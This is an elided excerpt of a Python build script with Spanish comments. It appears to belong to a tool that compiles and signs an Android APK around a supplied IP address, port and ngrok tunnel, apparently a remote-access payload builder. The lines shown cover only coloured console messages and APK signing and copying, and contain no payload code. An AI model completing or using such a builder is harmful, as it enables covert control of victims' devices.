...
# Usar raw string (r"") para evitar SyntaxWarning en escape sequences
...
def stdOutput(type_=None):
    if type_=="error":col="31m";str_text="ERROR"
    elif type_=="warning":col="33m";str_text="WARNING"
    elif type_=="success":col="32m";str_text="SUCCESS"
    elif type_ == "info":return "\033[1m[\033[33m\033[0m\033[1m\033[33mINFO\033[0m\033[1m] "
    else:return ""
    message = "\033[1m[\033[31m\033[0m\033[1m\033["+col+str_text+"\033[0m\033[1m]\033[0m "
    return message
...
def build(ip,port,output,ngrok=False,ng=None,icon=None):
    ...
    if not resOut.returncode:
        ...
        # Mejorado: Manejar error de zipalign en Termux
        sign_cmd = "java -jar Jar_utils/sign.jar -a "+outFileName+" --overwrite"
        ...
        if not resOut.returncode:
            ...
            print(stdOutput("warning")+"Signing completed (some warnings are normal in Termux)")
            # Buscar el APK generado en Android_Code
            gradle_apk = "Android_Code"+direc+"app"+direc+"release"+direc+"app-release.apk"
            if os.path.exists(gradle_apk):
                print(stdOutput("info")+"\033[0mCopying APK from Gradle output...")
                execute("cp "+gradle_apk+" "+outFileName)
                print(stdOutput("success")+"Successfully copied the apk to \033[1m\033[32m"+getpwd(outFileName)+"\033[0m")
    else:
        print("\r"+resOut.stderr)
